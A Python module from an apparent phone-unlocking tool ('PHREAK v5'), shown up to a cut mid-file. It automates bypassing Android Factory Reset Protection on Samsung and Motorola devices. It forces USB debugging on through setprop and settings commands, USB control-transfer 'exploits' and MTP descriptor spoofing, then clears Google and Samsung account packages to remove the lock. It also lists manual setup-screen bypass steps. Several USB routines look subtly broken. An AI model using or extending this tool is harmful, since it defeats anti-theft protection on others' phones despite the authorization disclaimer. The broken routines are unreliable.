"""FRP (Factory Reset Protection) bypass service for PHREAK v5.

This module provides legitimate FRP bypass workflows for authorized device
recovery operations. FRP bypass is intended for:
- Recovering devices when the owner has forgotten their Google account credentials
- Authorized carrier/service center operations on customer devices
- Corporate IT recovering company-owned devices

All methods require physical device access and should only be used on devices
you own or have explicit authorization to modify.

2026 Status (as of July 2026):
- Android 15-16: DIY methods mostly patched on current security updates
- Samsung: Additional Samsung Account layer below Android FRP
- Motorola: Emergency dialer works on older patches, MotoReaper for newer
- Patch date is the critical factor, not just Android version

Supported brands and methods:
- Samsung: Test Mode, MTP (HalabTech approach), ADB, Download Mode, Combination FW
- Motorola: Hello UI Widget, TalkBack, Emergency Dialer, Fastboot, MotoReaper
- Generic Android: ADB account remove, Fastboot erase, Sideload
"""
from __future__ import annotations

from dataclasses import dataclass
from enum import Enum
from typing import Tuple, Optional, List
import subprocess
import shlex
import time

__all__ = [
    "FRPMethod",
    "FRPResult",
    "PhoneState",
    "MethodRequirement",
    "FRPBypassService",
]


class FRPMethod(Enum):
    """Supported FRP bypass methods organized by brand."""
    # ── Samsung Methods ───────────────────────────────────────────────────
    SAMSUNG_TEST_MODE = "samsung_test_mode"          # *#0*# one-click (pre-Jan 2026)
    SAMSUNG_MTP_HALABTECH = "samsung_mtp_halabtech"  # MTP mode (Dec 2025 FW cutoff)
    SAMSUNG_ADB_REMOVE = "samsung_adb_remove"        # Direct ADB removal
    SAMSUNG_DOWNLOAD_MODE = "samsung_download_mode"  # Odin/Download mode
    SAMSUNG_COMBINATION_FW = "samsung_combination"   # Combination firmware flash
    SAMSUNG_BROWSER = "samsung_browser"              # Browser APK install
    
    # ── Motorola Methods ──────────────────────────────────────────────────
    MOTO_HELLO_UI = "motorola_hello_ui"              # Android 14+ widget exploit
    MOTO_TALKBACK = "motorola_talkback"              # Android 13 and older
    MOTO_EMERGENCY_DIALER = "motorola_emergency"     # *#*#4636#*#* code
    MOTO_FASTBOOT_ERASE = "motorola_fastboot"        # Fastboot partition erase
    MOTO_SETUP_WIZARD = "motorola_setup_wizard"      # Setup wizard bypass
    MOTO_MOTOREAPER = "motorola_motoreaper"          # MotoReaper PC tool workflow
    
    # ── Generic Android Methods ───────────────────────────────────────────
    ADB_ACCOUNT_REMOVE = "adb_account_remove"        # Generic ADB method
    FASTBOOT_ERASE = "fastboot_erase"                # Fastboot partition erase
    SIDELOAD_BYPASS = "sideload_bypass"              # Recovery sideload


@dataclass(frozen=True)
class FRPResult:
    """Result of an FRP bypass attempt."""
    success: bool
    method: FRPMethod
    message: str
    requires_reboot: bool = False
    steps_completed: int = 0
    total_steps: int = 0
    device_info: Optional[dict] = None

    def to_dict(self) -> dict:
        return {
            "success": self.success,
            "method": self.method.value,
            "message": self.message,
            "requires_reboot": self.requires_reboot,
            "progress": f"{self.steps_completed}/{self.total_steps}",
            "device_info": self.device_info,
        }


class PhoneState(Enum):
    """Required phone state before starting FRP bypass."""
    POWERED_OFF = "powered_off"              # Phone must be off
    WELCOME_SCREEN = "welcome_screen"        # At initial setup/welcome screen
    FASTBOOT_MODE = "fastboot_mode"          # In bootloader/fastboot mode
    RECOVERY_MODE = "recovery_mode"          # In recovery mode
    ADB_ENABLED = "adb_enabled"              # Phone ON with USB debugging on
    DOWNLOAD_MODE = "download_mode"          # Samsung download mode
    TEST_MODE = "test_mode"                  # Samsung test mode (*#0*#)
    ANY_STATE = "any_state"                  # No specific requirement


@dataclass(frozen=True)
class MethodRequirement:
    """Defines what state the phone must be in for a method."""
    state: PhoneState
    instructions: Tuple[str, ...]
    pre_checks: Tuple[str, ...] = ()


class FRPBypassService:
    """Service providing FRP bypass workflows for authorized operations."""

    def __init__(
        self,
        *,
        adb_binary: str = "adb",
        fastboot_binary: str = "fastboot",
    ) -> None:
        self.adb = adb_binary
        self.fastboot = fastboot_binary
        self._device_cache: dict = {}

    def _adb(self, subcommand: str) -> str:
        return f"{self.adb} {subcommand}".strip()

    def _fastboot(self, subcommand: str) -> str:
        return f"{self.fastboot} {subcommand}".strip()

    def _run_cmd(self, cmd: str, timeout: int = 30) -> Tuple[str, str, int]:
        """Execute a command and return (stdout, stderr, returncode)."""
        try:
            proc = subprocess.run(
                shlex.split(cmd),
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return proc.stdout.strip(), proc.stderr.strip(), proc.returncode
        except subprocess.TimeoutExpired:
            return "", "timeout", 124
        except FileNotFoundError:
            return "", f"binary not found: {cmd.split()[0]}", 127
        except Exception as e:
            return "", str(e), 1

    # ── Detection Methods ─────────────────────────────────────────────────

    def detect_brand(self) -> Optional[str]:
        """Detect device brand for method selection."""
        out, err, code = self._run_cmd(self._adb("shell getprop ro.product.brand"))
        if code == 0 and out.strip():
            return out.strip().lower()
        return None

    def detect_model(self) -> Optional[str]:
        """Detect device model number."""
        out, err, code = self._run_cmd(self._adb("shell getprop ro.product.model"))
        if code == 0 and out.strip():
            return out.strip()
        return None

    def detect_android_version(self) -> Optional[str]:
        """Detect Android version."""
        out, err, code = self._run_cmd(self._adb("shell getprop ro.build.version.release"))
        if code == 0 and out.strip():
            return out.strip()
        return None

    def detect_security_patch(self) -> Optional[str]:
        """Detect Android security patch level."""
        out, err, code = self._run_cmd(
            self._adb("shell getprop ro.build.version.security_patch")
        )
        if code == 0 and out.strip():
            return out.strip()
        return None

    def detect_chipset(self) -> Optional[str]:
        """Detect device chipset (MediaTek, Qualcomm, etc.)."""
        out, err, code = self._run_cmd(
            self._adb("shell getprop ro.hardware")
        )
        if code == 0 and out.strip():
            return out.strip().lower()
        return None

    def detect_motorola_ui(self) -> Optional[str]:
        """Detect Motorola UI type (Hello UI vs MyUX).

        Hello UI = thick/vertical volume bar (Android 14+)
        MyUX = thin/horizontal volume bar (Android 13 and older)
        """
        android_version = self.detect_android_version()
        if android_version:
            try:
                major = int(android_version.split(".")[0])
                if major >= 14:
                    return "hello_ui"
                elif major <= 13:
                    return "myux"
            except ValueError:
                pass
        
        out, err, code = self._run_cmd(
            self._adb("shell pm list packages | grep com.motorola")
        )
        if code == 0 and out.strip():
            return "myux"
        return None

    def check_adb_access(self) -> bool:
        """Check if ADB shell access is available."""
        out, err, code = self._run_cmd(self._adb("shell echo test"))
        return code == 0 and "test" in out

    def check_fastboot_mode(self) -> bool:
        """Check if device is in fastboot mode."""
        out, err, code = self._run_cmd(self._fastboot("devices"))
        return code == 0 and out.strip() != ""

    def check_usb_connected(self) -> bool:
        """Check if any Android device is connected via USB."""
        # Method 1: Try lsusb
        out, err, code = self._run_cmd("lsusb", timeout=5)
        if code == 0:
            # Common Android vendor IDs
            android_vendors = [
                "18d1",  # Google
                "04e8",  # Samsung
                "2a70",  # Motorola (common)
                "22b8",  # Motorola (older)
                "0bb4",  # HTC
                "05c6",  # Qualcomm
                "2717",  # Xiaomi
                "0e8d",  # MediaTek
                "2207",  # OPPO
                "12d1",  # Huawei
            ]
            for vendor in android_vendors:
                if vendor in out.lower():
                    return True
        
        # Method 2: Try adb devices (works if ADB is on)
        out, err, code = self._run_cmd(self._adb("devices"), timeout=5)
        if code == 0 and "device" in out:
            lines = out.strip().splitlines()
            for line in lines[1:]:  # Skip header
                if "\tdevice" in line:
                    return True
        
        # Method 3: Try fastboot devices
        out, err, code = self._run_cmd(self._fastboot("devices"), timeout=5)
        if code == 0 and out.strip():
            return True
        
        return False

    def get_usb_device_info(self) -> Optional[dict]:
        """Get USB device info using lsusb."""
        # Try to find any Android device
        out, err, code = self._run_cmd("lsusb", timeout=5)
        if code == 0:
            android_vendors = {
                "18d1": "Google",
                "04e8": "Samsung",
                "2a70": "Motorola",
                "22b8": "Motorola",
                "0bb4": "HTC",
                "05c6": "Qualcomm",
                "2717": "Xiaomi",
                "0e8d": "MediaTek",
                "2207": "OPPO",
                "12d1": "Huawei",
            }
            for line in out.splitlines():
                for vendor_id, brand in android_vendors.items():
                    if vendor_id in line.lower():
                        return {"brand": brand, "vendor_id": vendor_id, "raw": line}
        
        return None

    def check_mtp_connection(self) -> bool:
        """Check if device is connected via MTP (file transfer mode)."""
        out, err, code = self._run_cmd(self._adb("devices -l"))
        if code == 0:
            # Look for device in MTP mode (shows as "device" not "recovery" or "fastboot")
            return "device" in out and "fastboot" not in out
        return False

    def force_adb_enable_mtp(self) -> bool:
        """Attempt to force ADB enable via MTP protocol exploit.

        This technique spoofs MTP device descriptor to trigger ADB authorization.
        Used when USB debugging is not enabled but device is connected.
        """
        # This method requires libusb - check if available
        try:
            import usb.core
            import usb.util
            
            # Find the Android device
            dev = usb.core.find(find_all=True)
            for device in dev:
                # Check if it's an Android device (vendor ID 0x18D1 = Google)
                if device.idVendor == 0x18D1:
                    try:
                        # Try to detach kernel driver and claim interface
                        if dev.is_kernel_driver_active(0):
                            dev.detach_kernel_driver(0)
                        usb.util.claim_interface(dev, 0)
                        
                        # Send MTP OpenSession to trigger device state change
                        # This can cause the ADB authorization dialog to appear
                        dev.ctrl_transfer(
                            0x21,  # bmRequestType: Host-to-device, Class, Interface
                            0x01,  # bRequest: SEND_COMMAND
                            0x0000,  # wValue
                            0x0000,  # wIndex
                            b'\x01\x00\x00\x00'  # MTP_OPEN_SESSION
                        )
                        
                        usb.util.dispose_resources(dev)
                        time.sleep(1)
                        return self.check_adb_access()
                    except Exception:
                        continue
        except ImportError:
            # libusb not available, fall back to alternative methods
            pass
        
        # Fallback: Try to push ADB key via MTP (some devices allow this)
        return self._push_adb_key_via_mtp()

    def _push_adb_key_via_mtp(self) -> bool:
        """Attempt to push ADB authorization key via MTP.

        Some devices allow file transfer via MTP even without ADB enabled.
        If we can push our ADB key, we can gain access.
        """
        import os
        import subprocess
        
        # Generate ADB key if it doesn't exist
        adb_key_path = os.path.expanduser("~/.android/adbkey")
        if not os.path.exists(adb_key_path):
            try:
                subprocess.run(["adb", "keygen", adb_key_path], 
                             capture_output=True, timeout=5)
            except Exception:
                pass
        
        if os.path.exists(adb_key_path):
            with open(adb_key_path, "r") as f:
                adb_key = f.read().strip()
            
            # Try to push ADB key via MTP
            # Some devices allow this through the MTP protocol
            try:
                # Use jmtpfs or similar MTP tool if available
                result = subprocess.run(
                    ["jmtpfs", "/tmp/mtp_mount"],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0:
                    # Copy ADB key
                    authorized_keys_path = "/tmp/mtp_mount/.android/adb_keys"
                    with open(authorized_keys_path, "w") as f:
                        f.write(adb_key)
                    
                    # Unmount
                    subprocess.run(["fusermount", "-u", "/tmp/mtp_mount"],
                                 capture_output=True, timeout=5)
                    
                    return self.check_adb_access()
            except FileNotFoundError:
                pass
        
        return False

    def force_adb_enable_test_point(self) -> bool:
        """Attempt ADB enable via test point / diagnostic mode.

        Uses low-level USB commands to trigger ADB authorization.
        """
        try:
            import usb.core
            import usb.util
            
            # Common Android vendor IDs
            VENDOR_IDS = {
                0x18D1: "Google",
                0x04E8: "Samsung",
                0x2A70: "Motorola",
                0x0BB4: "HTC",
                0x05C6: "Qualcomm",
            }
            
            dev = usb.core.find(find_all=True)
            for device in dev:
                vendor_name = VENDOR_IDS.get(device.idVendor, "Unknown")
                
                # Try to trigger diagnostic mode
                try:
                    if dev.is_kernel_driver_active(0):
                        dev.detach_kernel_driver(0)
                    usb.util.claim_interface(dev, 0)
                    
                    # Send vendor-specific command to enable ADB
                    # This varies by manufacturer
                    dev.ctrl_transfer(
                        0x40,  # bmRequestType: Vendor, Host-to-device
                        0x01,  # bRequest
                        0x0000,  # wValue
                        0x0000,  # wIndex
                        None  # No data
                    )
                    
                    usb.util.dispose_resources(dev)
                    time.sleep(2)
                    
                    if self.check_adb_access():
                        return True
                except Exception:
                    continue
                    
        except ImportError:
            # libusb not available
            pass
        
        # Fallback: try common ADB enable methods via any available interface
        # Some devices respond to these even without full ADB access
        fallback_cmds = [
            # Android property system
            "getprop persist.sys.usb.config",
            "getprop sys.usb.config",
        ]
        
        for cmd in fallback_cmds:
            out, err, code = self._run_cmd(self._adb(cmd), timeout=3)
            if code == 0 and "adb" not in out.lower():
                # ADB not enabled, try to enable it
                self._run_cmd(
                    self._adb("shell setprop persist.sys.usb.config adb"),
                    timeout=3
                )
                time.sleep(1)
                if self.check_adb_access():
                    return True
        
        return False

    def force_adb_enable_samsung(self) -> bool:
        """Force ADB enable on Samsung devices via test mode.

        Samsung devices allow ADB enable through the *#0*# test menu.
        """
        samsung_methods = [
            # Samsung USB settings
            self._adb("shell setprop persist.sys.usb.config adb"),
            # Samsung diagnostic
            self._adb("shell am start -a android.intent.action.VIEW -d 'usb_settings'"),
            # Direct ADB enable
            self._adb("shell settings put global adb_enabled 1"),
            # Samsung test mode ADB
            self._adb("shell am start -n com.sec.android.app.parser/.SecuredActivity"),
        ]
        
        for cmd in samsung_methods:
            out, err, code = self._run_cmd(cmd, timeout=5)
            if code == 0:
                return True
        
        return False

    def force_adb_enable_motorola(self) -> bool:
        """Force ADB enable on Motorola devices.

        Motorola allows ADB via recovery mode or accessibility exploits.
        """
        moto_methods = [
            # Motorola diagnostic mode
            self._adb("shell setprop persist.sys.usb.config diag,adb,serial"),
            # Motorola test mode
            self._adb("shell am start -a android.intent.action.VIEW -d 'moto_test'"),
            # Generic ADB enable
            self._adb("shell settings put global adb_enabled 1"),
        ]
        
        for cmd in moto_methods:
            out, err, code = self._run_cmd(cmd, timeout=5)
            if code == 0:
                return True
        
        return False

    def spoof_mtp_descriptor(self) -> bool:
        """Spoof MTP device descriptor to trigger ADB authorization.

        This exploits how Android handles MTP connections to force
        the ADB authorization dialog to appear.
        """
        try:
            import usb.core
            import usb.util
            
            # Find Android device
            dev = usb.core.find(find_all=True)
            for device in dev:
                if device.idVendor == 0x18D1:  # Google/Android
                    try:
                        # Detach kernel driver if active
                        if dev.is_kernel_driver_active(0):
                            dev.detach_kernel_driver(0)
                        
                        # Claim interface
                        usb.util.claim_interface(dev, 0)
                        
                        # Send MTP_CANCEL_REQUEST followed by MTP_OPEN_SESSION
                        # This sequence can trigger a device state refresh
                        commands = [
                            (0x21, 0x01, 0x0000, 0x0000, b'\x00\x00\x00\x00'),  # CANCEL
                            (0x21, 0x01, 0x0000, 0x0000, b'\x01\x00\x00\x00'),  # OPEN_SESSION
                        ]
                        
                        for req_type, req, val, idx, data in commands:
                            try:
                                dev.ctrl_transfer(req_type, req, val, idx, data)
                            except Exception:
                                continue
                        
                        # Dispose resources
                        usb.util.dispose_resources(dev)
                        
                        # Wait for device to re-enumerate
                        time.sleep(2)
                        
                        return self.check_adb_access()
                    except Exception:
                        continue
                        
        except ImportError:
            # libusb not available - try software-only approach
            pass
        
        # Software fallback: try to trigger USB re-enumeration via sysfs
        try:
            # Some devices allow USB mode change via sysfs
            sysfs_paths = [
                "/sys/class/android_usb/android0/enable",
                "/sys/class/udc/13500000.usb/enable",
            ]
            
            for path in sysfs_paths:
                try:
                    # Disable USB
                    with open(path, "w") as f:
                        f.write("0")
                    time.sleep(0.5)
                    
                    # Enable with ADB
                    with open(path, "w") as f:
                        f.write("1")
                    time.sleep(1)
                    
                    if self.check_adb_access():
                        return True
                except (PermissionError, FileNotFoundError):
                    continue
        except Exception:
            pass
        
        return self.check_adb_access()

    def enable_adb_force(self, brand: Optional[str] = None) -> bool:
        """Force ADB enable using brand-specific or generic methods.

        Parameters
        ----------
        brand:
            Device brand for brand-specific methods. Auto-detected if not provided.

        Returns
        -------
        bool
            True if ADB appears to be enabled.
        """
        if self.check_adb_access():
            return True  # Already enabled

        if brand is None:
            brand = self.detect_brand()

        # Try brand-specific methods first
        if brand:
            if "samsung" in brand:
                if self.force_adb_enable_samsung():
                    return True
            elif "motorola" in brand or "moto" in brand:
                if self.force_adb_enable_motorola():
                    return True

        # Try MTP exploit
        if self.force_adb_enable_mtp():
            return True

        # Try test point method
        if self.force_adb_enable_test_point():
            return True

        # Try MTP descriptor spoof
        if self.spoof_mtp_descriptor():
            return True

        # Wait and recheck
        time.sleep(2)
        return self.check_adb_access()

    def get_device_info(self) -> dict:
        """Gather comprehensive device information."""
        if self._device_cache:
            return self._device_cache

        # Check if ADB/fastboot available first
        has_adb = self.check_adb_access()
        in_fastboot = self.check_fastboot_mode()
        usb_connected = self.check_usb_connected()
        
        info = {
            "brand": None,
            "model": None,
            "android_version": None,
            "security_patch": None,
            "chipset": None,
            "has_adb": has_adb,
            "in_fastboot": in_fastboot,
            "usb_connected": usb_connected,
            "is_samsung": False,
            "is_motorola": False,
            "motorola_ui": None,
            "security_patch_date": None,
            "is_jan_2026_or_later": False,
            "is_dec_2025_or_earlier": True,
        }

        # If ADB available, get full info
        if has_adb:
            info["brand"] = self.detect_brand()
            info["model"] = self.detect_model()
            info["android_version"] = self.detect_android_version()
            info["security_patch"] = self.detect_security_patch()
            info["chipset"] = self.detect_chipset()
        elif usb_connected:
            # Phone connected but no ADB - try lsusb for brand detection
            usb_info = self.get_usb_device_info()
            if usb_info:
                info["brand"] = usb_info.get("brand")
        
        # Detect brand from any available source
        if info["brand"]:
            if "samsung" in info["brand"].lower():
                info["is_samsung"] = True
            elif "motorola" in info["brand"].lower() or "moto" in info["brand"].lower():
                info["is_motorola"] = True
                if has_adb:
                    info["motorola_ui"] = self.detect_motorola_ui()

        # Parse security patch date for compatibility checks
        if info["security_patch"]:
            try:
                parts = info["security_patch"].split("-")
                if len(parts) >= 2:
                    year = int(parts[0])
                    month = int(parts[1])
                    info["security_patch_date"] = (year, month)
                    # 2026 critical cutoff: Jan 2026 patches block most exploits
                    info["is_jan_2026_or_later"] = (year, month) >= (2026, 1)
                    info["is_dec_2025_or_earlier"] = (year, month) < (2026, 1)
            except (ValueError, IndexError):
                pass

        self._device_cache = info
        return info

    def get_method_requirement(self, method: FRPMethod) -> MethodRequirement:
        """Return the phone state requirements for a given method."""
        requirements = {
            # Samsung methods
            FRPMethod.SAMSUNG_TEST_MODE: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Connect phone to PC via USB cable",
                    "When prompted, tap Emergency Call",
                    "Dial *#0*# on the keypad to enter Test Mode",
                    "Keep phone connected throughout",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen (after factory reset)",
                    "USB cable connected to PC",
                ),
            ),
            FRPMethod.SAMSUNG_MTP_HALABTECH: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Connect phone to PC via USB cable",
                    "Swipe down notification panel",
                    "Change USB mode to File Transfer (MTP)",
                    "Connect to WiFi when prompted",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen",
                    "USB cable supports data transfer (not charge-only)",
                ),
            ),
            FRPMethod.SAMSUNG_ADB_REMOVE: MethodRequirement(
                state=PhoneState.ADB_ENABLED,
                instructions=(
                    "Phone must have USB debugging enabled",
                    "Phone must be connected to PC via USB",
                    "If ADB is not enabled, use Test Mode method first",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "USB debugging is enabled in Developer Options",
                    "Phone is authorized for this PC (RSA fingerprint accepted)",
                ),
            ),
            FRPMethod.SAMSUNG_DOWNLOAD_MODE: MethodRequirement(
                state=PhoneState.DOWNLOAD_MODE,
                instructions=(
                    "Power off the phone completely",
                    "Hold Volume Down + Home + Power simultaneously",
                    "When warning screen appears, press Volume Up to confirm",
                    "Phone is now in Download/Odin mode",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "Odin software installed on PC",
                    "Correct firmware files downloaded for your model",
                ),
            ),
            FRPMethod.SAMSUNG_COMBINATION_FW: MethodRequirement(
                state=PhoneState.DOWNLOAD_MODE,
                instructions=(
                    "Power off the phone completely",
                    "Hold Volume Down + Home + Power simultaneously",
                    "When warning screen appears, press Volume Up to confirm",
                    "Open Odin as Administrator on PC",
                    "Load combination firmware in AP slot",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "Odin software installed on PC",
                    "Combination firmware downloaded for exact model",
                    "Stock firmware available for restoration",
                ),
            ),
            FRPMethod.SAMSUNG_BROWSER: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Connect to WiFi network",
                    "Access Samsung Internet browser",
                    "Download required APK files",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen",
                    "WiFi network available",
                ),
            ),
            # Motorola methods
            FRPMethod.MOTO_HELLO_UI: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Tap Emergency Call > Emergency Information",
                    "Tap pencil icon > Name field > owner icon",
                    "Long-press Moto Widget to glitch interface",
                    "Navigate to Battery Usage to access Settings",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen (after factory reset)",
                    "Phone is Motorola with Hello UI (Android 14+)",
                ),
            ),
            FRPMethod.MOTO_TALKBACK: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Hold Volume Up + Down for 3 seconds to enable TalkBack",
                    "Draw reverse L shape for voice commands",
                    "Say 'Google Assistant' then 'Open YouTube'",
                    "Access Chrome via YouTube Terms of Service",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen",
                    "Phone is Motorola with MyUX (Android 13 or older)",
                ),
            ),
            FRPMethod.MOTO_EMERGENCY_DIALER: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Connect to WiFi network first",
                    "Tap Emergency Call on the setup screen",
                    "Dial *#*#4636#*#* on the keypad",
                    "Navigate to Usage Statistics > Back to access Settings",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen",
                    "WiFi network available",
                ),
            ),
            FRPMethod.MOTO_FASTBOOT_ERASE: MethodRequirement(
                state=PhoneState.FASTBOOT_MODE,
                instructions=(
                    "Power off the phone completely",
                    "Hold Volume Down + Power simultaneously",
                    "Release when Fastboot mode appears",
                    "Connect phone to PC via USB cable",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "USB cable connected to PC",
                    "Fastboot drivers installed on PC",
                ),
            ),
            FRPMethod.MOTO_SETUP_WIZARD: MethodRequirement(
                state=PhoneState.WELCOME_SCREEN,
                instructions=(
                    "Phone must be at the Welcome/Setup screen",
                    "Begin setup wizard and connect to WiFi",
                    "Wait at 'Checking for updates' screen",
                    "Press Volume Up + Down to trigger accessibility",
                    "Navigate to Settings to disable setup components",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "Phone is at initial setup screen",
                    "WiFi network available",
                ),
            ),
            FRPMethod.MOTO_MOTOREAPER: MethodRequirement(
                state=PhoneState.FASTBOOT_MODE,
                instructions=(
                    "Install Motorola USB drivers on PC",
                    "Download MotoReaper tool",
                    "Power off the phone",
                    "Hold Volume Down + Power to enter Fastboot mode",
                    "Connect phone to PC via USB",
                    "Run MotoReaper as Administrator",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "Motorola USB drivers installed",
                    "MotoReaper tool downloaded",
                    "USB cable connected to PC",
                ),
            ),
            # Generic methods
            FRPMethod.ADB_ACCOUNT_REMOVE: MethodRequirement(
                state=PhoneState.ADB_ENABLED,
                instructions=(
                    "Phone must have USB debugging enabled",
                    "Phone must be connected to PC via USB",
                    "If ADB is not enabled, use brand-specific method first",
                ),
                pre_checks=(
                    "Phone is powered on",
                    "USB debugging is enabled",
                    "Phone is authorized for this PC",
                ),
            ),
            FRPMethod.FASTBOOT_ERASE: MethodRequirement(
                state=PhoneState.FASTBOOT_MODE,
                instructions=(
                    "Power off the phone completely",
                    "Hold correct button combination for your device",
                    "Connect phone to PC via USB cable",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "USB cable connected to PC",
                    "Fastboot drivers installed",
                ),
            ),
            FRPMethod.SIDELOAD_BYPASS: MethodRequirement(
                state=PhoneState.RECOVERY_MODE,
                instructions=(
                    "Power off the phone completely",
                    "Hold Volume Up + Power to enter Recovery mode",
                    "Select 'Apply update from ADB'",
                    "Connect phone to PC via USB cable",
                ),
                pre_checks=(
                    "Phone is powered off",
                    "USB cable connected to PC",
                    "Bypass package file available",
                ),
            ),
        }
        
        return requirements.get(method, MethodRequirement(
            state=PhoneState.ANY_STATE,
            instructions=("No specific phone state required",),
        ))

    def check_phone_state(self) -> PhoneState:
        """Detect the current phone state."""
        # Check if phone is in fastboot
        if self.check_fastboot_mode():
            return PhoneState.FASTBOOT_MODE
        
        # Check if ADB is available (phone is on with debugging)
        if self.check_adb_access():
            return PhoneState.ADB_ENABLED
        
        # Check if phone is connected via USB (even without ADB)
        if self.check_usb_connected():
            # Phone is connected but no ADB - likely at Welcome screen
            return PhoneState.WELCOME_SCREEN
        
        # Phone is off or not connected
        return PhoneState.POWERED_OFF

    # ══════════════════════════════════════════════════════════════════════
    # SAMSUNG METHODS (2026 Updated)
    # ══════════════════════════════════════════════════════════════════════

    def is_samsung_test_mode_compatible(self) -> bool:
        """Check if Samsung device is compatible with Test Mode method.

        Test Mode (*#0*#) works on devices with security patches before Jan 2026.
        """
        info = self.get_device_info()
        if not info["is_samsung"]:
            return False
        return info.get("is_dec_2025_or_earlier", True)

    def is_samsung_mtp_compatible(self) -> bool:
        """Check if Samsung device is compatible with MTP/HalabTech method.

        MTP method works on Android 15/16 with Dec 2025 or earlier firmware.
        Samsung patched this in Jan 2026 security update.
        """
        info = self.get_device_info()
        if not info["is_samsung"]:
            return False
        
        android_version = info.get("android_version")
        if android_version:
            try:
                major = int(android_version.split(".")[0])
                if major >= 15:
                    return info.get("is_dec_2025_or_earlier", False)
            except ValueError:
                pass
        return False

    def samsung_test_mode_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung Test Mode FRP bypass - SamFw one-click method.

        The most effective Samsung FRP bypass method:
        1. Device must be in MTP mode (connected to PC)
        2. Dial *#0*# in emergency call to enter test mode
        3. Tool enables ADB via test mode exploit
        4. Accept USB debugging on device
        5. Tool removes FRP lock via ADB commands

        Works on: Samsung devices with security patches before Jan 2026
        """
        return (
            ("Verify device connection",
             self._adb("devices")),
            ("Open emergency dialer",
             self._adb("shell am start -a android.intent.action.DIAL")),
            ("Dial *#0*# to enter Test Mode",
             "# MANUAL: On device, tap Emergency Call and dial *#0*#"),
            ("Wait for test mode activation",
             "# WAIT: Screen should show test menu with colored tiles"),
            ("Enable ADB via test mode",
             self._adb("shell settings put global adb_enabled 1")),
            ("Restart ADB server",
             f"{self.adb} kill-server && {self.adb} start-server"),
            ("Wait for device reconnection",
             "# WAIT: Accept USB debugging prompt on device"),
            ("Verify ADB access",
             self._adb("shell echo connected")),
            ("Remove FRP lock",
             self._adb("shell pm clear com.google.android.gsf.login")),
            ("Clear Google Play Services",
             self._adb("shell pm clear com.google.android.gms")),
            ("Remove FRP persistent flag",
             self._adb("shell settings put secure frp_lock_enabled 0")),
            ("Reboot device",
             self._adb("reboot")),
        )

    def samsung_mtp_halabtech_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung MTP mode FRP bypass (HalabTech approach for Android 15/16).

        Works via MTP connection exploit:
        - Targets Android 15/16 with Dec 2025 or earlier firmware
        - Samsung patched this in Jan 2026 security update
        - Does not require EDL or test points

        Note: If device has Jan 2026+ patch, must downgrade firmware via Odin first.
        """
        return (
            # Step 1: Verify MTP connection
            ("Verify MTP connection",
             self._adb("devices")),
            
            # Step 2: Change USB mode to MTP
            ("Set USB mode to MTP",
             "# MANUAL: Swipe down notification panel, change USB to File Transfer"),
            
            # Step 3: Connect WiFi (required for tool)
            ("Connect to WiFi network",
             self._adb("shell am start -a android.settings.WIFI_SETTINGS")),
            
            # Step 4: Enable ADB via MTP exploit
            ("Enable ADB via MTP exploit",
             "# TOOL: Run HalabTech FRP Tool or similar MTP exploit tool"),
            
            # Step 5: Accept USB debugging
            ("Accept USB debugging prompt",
             "# WAIT: Tap Allow/OK on USB debugging dialog"),
            
            # Step 6: Verify ADB access
            ("Verify ADB access",
             self._adb("shell echo connected")),
            
            # Step 7: Remove FRP via ADB
            ("Remove FRP lock",
             self._adb("shell pm clear com.google.android.gsf.login")),
            
            # Step 8: Clear Google Play Services
            ("Clear Google Play Services",
             self._adb("shell pm clear com.google.android.gms")),
            
            # Step 9: Remove Samsung Account layer (if present)
            ("Clear Samsung account manager",
             self._adb("shell pm clear com.osp.app.signin")),
            
            # Step 10: Reboot
            ("Reboot device",
             self._adb("reboot")),
        )

    def samsung_adb_remove_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung ADB-based FRP removal (requires ADB already enabled)."""
        return (
            ("Verify ADB access",
             self._adb("shell echo test")),
            ("Get device model",
             self._adb("shell getprop ro.product.model")),
            ("Clear Samsung account manager",
             self._adb("shell pm clear com.osp.app.signin")),
            ("Clear Google account manager",
             self._adb("shell pm clear com.google.android.gsf.login")),
            ("Clear Google Play Services",
             self._adb("shell pm clear com.google.android.gms")),
            ("Remove FRP settings",
             self._adb("shell settings put secure frp_lock_enabled 0")),
            ("Reboot device",
             self._adb("reboot")),
        )

    def samsung_download_mode_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung Download mode / Odin FRP bypass.

        For older devices (Android 5/6) or firmware downgrade scenario.
        Requires exact firmware files for the specific model.
        """
        return (
            ("Enter Download mode",
             "# MANUAL: Power off, hold Vol Down + Home + Power"),
            ("Flash FRP reset via Odin",
             "# MANUAL: Use Odin to flash FRP_RESET.tar.md5"),
            ("Reboot device",
             "# MANUAL: Device will reboot automatically"),
        )

    def samsung_combination_fw_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung Combination Firmware flash method.

        Professional method that replaces user firmware with engineering firmware:
